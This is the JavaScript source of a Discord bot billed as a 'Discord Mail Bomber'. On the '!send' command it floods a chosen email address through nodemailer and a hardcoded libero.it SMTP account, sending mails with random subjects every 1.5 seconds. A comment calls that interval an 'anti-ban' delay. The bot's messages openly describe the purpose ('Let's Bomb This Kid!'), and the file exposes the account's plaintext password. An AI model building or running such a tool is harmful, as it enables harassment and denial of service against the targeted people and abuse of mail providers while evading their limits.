
//Now you can choose the mail text,edited the spam delay + free libero.it account for spamming


const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = "!"
const nodemailer = require("nodemailer");
var spamming;

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    spamming = false;
    console.log("spamming is: " + spamming)
  });


client.on('message', async msg => {
    var args = msg.content.split(' ').slice(1);
    var command = msg.content.toLowerCase().slice(prefix.length).split(' ')[0];
    if(msg.author.bot) return;



if (command === 'send') {
  if (spamming == true) return msg.reply("A mail bombing is already active! Please use '!stop' before a new attack");

    if (!args[0]) 
        return  msg.reply("You need to insert a mail target!");

        
        function randomLetters(length) {
          var text = "";
          var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
          for (var i = 0; i < length; i++)
            text += possible.charAt(Math.floor(Math.random() * possible.length));
             return text;
          }

       
          
        var mailto = args[0]
        var mailtxt = args[1]

        let transporter = nodemailer.createTransport({
            host: "smtp.libero.it", //smtp server
            port: 25,
            secure: false, // true for 465, false for other ports
            auth: {
              user: 'fsociety0101@libero.it', // mail
              pass: 'mrrobot666' // password
            }
          });
        
          // setup email data with unicode symbols
          let mailOptions = {
            from: '"Mr.RObot" <fsociety0101@libero.it>', // sender address
            to: mailto, // list of receivers
            subject: (randomLetters(8)), // Subject line
            text: mailtxt, // plain text body
            html: "<b>" + mailtxt + "</b>" // html body
          };
        

        async function sendMail() {
          let info = await transporter.sendMail(mailOptions)
          spamming = true;
          }
          

            const spammingMessage = setInterval(() => {
              var mailto = args[0]
                  mailOptions.subject = (randomLetters(8))
                  var mailtxt = (randomLetters(10))
          
                      sendMail();
                      
                  }, 1500); //Updated sending delay, anti-ban

        msg.channel.send({embed: {
            color: 3447003,
            author: {
              name: client.user.username,
              icon_url: client.user.avatarURL
            },
            title: "Bombing",
            description: "Bot Developed By Mental#1424",
            fields: [{
                name: "Let's Bomb This Kid!",
                value: "Bombing In Progress..."
              },
            {
                name: "Target Mail",
                value: mailto,
              },

            ],
            timestamp: new Date(),
            footer: {
              icon_url: client.user.avatarURL,
              text: "© Discord Mail Bomber"
            }
            
            
          }
          
        });
      }
      
      if(command === "stop") {
        if (spamming == false) return msg.reply("There isn't any active bombing!")
        msg.channel.send("Stopped! Bot Shutdown")
        client.destroy()
    }

    if(command === "info") {
      msg.channel.send({embed: {
          color: 3447003,
          author: {
            name: client.user.username,
            icon_url: client.user.avatarURL
          },
          title: "Info",
          description: 'Bot developed by Mental#1424'+'\n'+'Special Thanks To: ' + 'Exploit#1337',
          fields: [{
              name: "Find Me On Github!",
              value: "[Click This](https://github.com/MyNameIsMental)"
            },

          {
              name: "Command Sytax",
              value: "!send targetmail@targetmail.com text"
            },

            {
              name: "Stop",
              value: "Use !stop for stopping the mail bombing"
            }
          ],
          timestamp: new Date(),
          footer: {
            icon_url: client.user.avatarURL,
            text: "© Discord Mail Bomber"
          }
        }
      })
        };

    }) 
      
    
        
        
    
            
            
  

    
    
    




client.login('NoU');
